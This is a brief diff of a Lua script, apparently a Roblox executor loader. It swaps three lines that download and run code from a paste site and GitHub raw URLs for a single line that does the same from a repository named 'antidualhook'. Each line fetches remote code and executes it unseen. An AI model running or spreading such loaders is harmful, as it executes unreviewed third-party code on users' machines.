@@ -1,6 +1,1 @@
-pcall(function() loadstring(game:HttpGet("https://cdn.sourceb.in/bins/fIpHlTbrCh/0"))() end)
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ManuScriptxHub/loading-screen/refs/heads/main/aaloading"))() end)
-
-task.wait(40)
-
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/hanniii1/Loader/refs/heads/main/BFLoader.lua"))() end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ManuScriptxHub/antidualhook/refs/heads/main/pakyou"))()
